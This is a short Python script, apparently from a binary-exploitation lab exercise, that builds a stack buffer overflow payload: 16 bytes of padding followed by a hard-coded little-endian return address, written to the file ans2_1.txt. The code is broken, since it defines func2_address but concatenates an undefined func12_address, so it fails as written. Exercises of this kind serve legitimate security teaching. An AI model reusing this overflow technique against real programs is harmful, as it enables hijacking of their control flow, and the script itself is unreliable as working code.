padding = b"A" * 16
func2_address = b"\x4c\x12\x40\x00\x00\x00\x00\x00"  # 小端地址
payload = padding+ func12_address

with open("ans2_1.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans2_1.txt")